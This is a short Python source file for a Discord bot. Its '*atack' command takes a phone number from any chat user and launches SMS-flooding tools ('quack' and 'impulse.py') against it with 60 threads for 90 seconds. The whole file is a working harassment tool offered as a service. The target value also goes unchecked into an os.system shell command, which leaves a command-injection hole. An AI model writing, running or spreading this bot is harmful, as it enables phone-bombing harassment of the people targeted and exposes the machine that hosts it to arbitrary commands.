import discord
from discord.ext import commands
from monda import SI # SI its the token
import datetime
import os

bot = commands.Bot(command_prefix='*', description="Test bot")
# Event
@bot.event
async def on_ready():
   await bot.change_presence(activity=discord.Streaming(name="paiwebb.herokuapp.com", url="https://twitch.tv/monda"))
   print("\033[4;35m"+"bot on")


@bot.command()
async def info(ctx):
   embed3 = discord.Embed(title ="the number must be attached with the number prefix, example (*atack +573201233234)", color=0x00ff00)
   await ctx.send(embed=embed3)


@bot.command()
async def atack(ctx,arg):
      embed = discord.Embed(title ="the attack takes between 4-5 minutes", color=0x00ff00, timestamp=datetime.datetime.utcnow())
      await ctx.send(embed=embed)
      #atack
      os.system(f"cd quack ; python3 quack --tool SMS --target  {arg} --threads 60 --timeout 90")
      os.system(f"python3 impulse.py --method SMS --time 90 --threads 60 --target {arg} ")

      embed2 = discord.Embed(title ="atack completed! :skull:" ,color=0x00ff00,  timestamp=datetime.datetime.utcnow())
      await ctx.send(embed=embed2)
      

bot.run(SI)



